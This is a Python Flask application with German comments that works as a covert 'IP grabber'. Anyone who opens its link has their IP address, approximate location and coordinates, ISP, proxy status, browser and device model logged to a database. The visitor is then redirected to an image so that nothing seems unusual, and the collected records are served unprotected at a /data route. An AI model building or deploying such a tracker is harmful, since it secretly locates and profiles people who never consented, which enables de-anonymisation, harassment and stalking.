from flask import Flask, request, jsonify, redirect
import sqlite3
import requests
from datetime import datetime
import os
import json

app = Flask(__name__)

# --- Datenbank initialisieren (erweiterte Tabelle) ---
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address TEXT,
            user_agent TEXT,
            platform TEXT,
            browser TEXT,
            browser_version TEXT,
            device_type TEXT,
            device_model TEXT,
            city TEXT,
            region TEXT,
            country TEXT,
            latitude REAL,
            longitude REAL,
            timestamp TEXT,
            timestamp_readable TEXT,
            timezone TEXT,
            language TEXT,
            screen_resolution TEXT,
            referrer TEXT,
            isp TEXT,
            asn TEXT,
            is_proxy BOOLEAN
        )
    ''')
    conn.commit()
    conn.close()

# --- IP-Geolocation (erweitert) ---
def get_ip_geolocation(ip):
    try:
        # Mehr Felder abfragen (inkl. ISP, ASN, Proxy)
        response = requests.get(
            f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,as,asname,proxy,mobile',
            timeout=5
        )
        data = response.json()
        if data.get('status') == 'success':
            return {
                'city': data.get('city', ''),
                'region': data.get('regionName', ''),
                'country': data.get('country', ''),
                'latitude': data.get('lat', 0.0),
                'longitude': data.get('lon', 0.0),
                'isp': data.get('isp', ''),
                'asn': data.get('as', ''),
                'is_proxy': data.get('proxy', False),
                'is_mobile': data.get('mobile', False)
            }
    except:
        pass
    return {
        'city': '', 'region': '', 'country': '',
        'latitude': 0.0, 'longitude': 0.0,
        'isp': '', 'asn': '', 'is_proxy': False, 'is_mobile': False
    }

# --- User-Agent parsen (erweitert) ---
def parse_user_agent(user_agent):
    ua = user_agent.lower()
    
    # Betriebssystem
    platform = 'Unknown'
    if 'windows' in ua: platform = 'Windows'
    elif 'macintosh' in ua or 'mac os' in ua: platform = 'macOS'
    elif 'linux' in ua: platform = 'Linux'
    elif 'android' in ua: platform = 'Android'
    elif 'iphone' in ua or 'ipad' in ua: platform = 'iOS'
    
    # Browser
    browser = 'Unknown'
    browser_version = ''
    if 'edg' in ua:
        browser = 'Edge'
        # Version extrahieren (einfach)
        try:
            if 'edg/' in ua:
                browser_version = ua.split('edg/')[1].split('.')[0]
        except: pass
    elif 'opr' in ua or 'opera' in ua:
        browser = 'Opera'
        try:
            if 'opr/' in ua:
                browser_version = ua.split('opr/')[1].split('.')[0]
        except: pass
    elif 'chrome' in ua and 'android' not in ua:
        browser = 'Chrome'
        try:
            if 'chrome/' in ua:
                browser_version = ua.split('chrome/')[1].split('.')[0]
        except: pass
    elif 'safari' in ua and 'chrome' not in ua:
        browser = 'Safari'
        try:
            if 'version/' in ua:
                browser_version = ua.split('version/')[1].split('.')[0]
        except: pass
    elif 'firefox' in ua:
        browser = 'Firefox'
        try:
            if 'firefox/' in ua:
                browser_version = ua.split('firefox/')[1].split('.')[0]
        except: pass
    
    # Gerätetyp
    device_type = 'Desktop'
    if 'mobile' in ua or 'android' in ua:
        device_type = 'Mobile'
    elif 'tablet' in ua or 'ipad' in ua:
        device_type = 'Tablet'
    
    # Gerätemodell (für Mobile)
    device_model = 'Unknown'
    if 'iphone' in ua:
        if 'iphone 15' in ua: device_model = 'iPhone 15'
        elif 'iphone 14' in ua: device_model = 'iPhone 14'
        elif 'iphone 13' in ua: device_model = 'iPhone 13'
        elif 'iphone' in ua: device_model = 'iPhone'
    elif 'samsung' in ua:
        if 'galaxy s' in ua: device_model = 'Samsung Galaxy S'
        else: device_model = 'Samsung'
    
    return platform, browser, browser_version, device_type, device_model

# --- Hauptroute: Trackt und leitet zum Bild weiter ---
@app.route('/')
def track_and_redirect():
    # 1. IP-Adresse
    ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    
    # 2. Geolocation + ISP + ASN + Proxy
    geo = get_ip_geolocation(ip)
    
    # 3. User-Agent parsen
    user_agent = request.headers.get('User-Agent', '')
    platform, browser, browser_version, device_type, device_model = parse_user_agent(user_agent)
    
    # 4. Zusätzliche Client-Informationen
    language = request.headers.get('Accept-Language', '').split(',')[0] if request.headers.get('Accept-Language') else ''
    referrer = request.headers.get('Referer', '')
    
    # 5. Timestamp
    now = datetime.now()
    timestamp = now.isoformat()
    timestamp_readable = now.strftime('%Y-%m-%d %H:%M:%S')
    timezone = 'UTC'  # Fallback
    try:
        import pytz
        timezone = str(datetime.now().astimezone().tzinfo) or 'UTC'
    except:
        pass
    
    # 6. In Datenbank speichern
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO clicks (
            ip_address, user_agent, platform, browser, browser_version,
            device_type, device_model, city, region, country,
            latitude, longitude, timestamp, timestamp_readable,
            timezone, language, screen_resolution, referrer,
            isp, asn, is_proxy
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        ip, user_agent, platform, browser, browser_version,
        device_type, device_model, geo['city'], geo['region'], geo['country'],
        geo['latitude'], geo['longitude'], timestamp, timestamp_readable,
        timezone, language, '', referrer,  # screen_resolution wird später per JS gesetzt
        geo['isp'], geo['asn'], geo['is_proxy']
    ))
    conn.commit()
    conn.close()
    
    return redirect('https://i.postimg.cc/9MWQhv5r/ograda.jpg', 302)

# --- Daten anzeigen (erweitert) ---
@app.route('/data')
def view_data():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('SELECT * FROM clicks ORDER BY id DESC LIMIT 100')
    rows = c.fetchall()
    conn.close()
    
    columns = [
        'id', 'ip_address', 'user_agent', 'platform', 'browser',
        'browser_version', 'device_type', 'device_model', 'city', 'region',
        'country', 'latitude', 'longitude', 'timestamp', 'timestamp_readable',
        'timezone', 'language', 'screen_resolution', 'referrer',
        'isp', 'asn', 'is_proxy'
    ]
    
    result = []
    for row in rows:
        result.append(dict(zip(columns, row)))
    
    return jsonify(result)

# --- Daten zurücksetzen ---
@app.route('/resetdata', methods=['GET'])
def reset_data():
    try:
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        c.execute('DELETE FROM clicks')
        c.execute("DELETE FROM sqlite_sequence WHERE name='clicks'")
        conn.commit()
        conn.close()
        
        return jsonify({
            'status': 'success',
            'message': 'All data deleted successfully'
        }), 200
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

# --- Start ---
if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)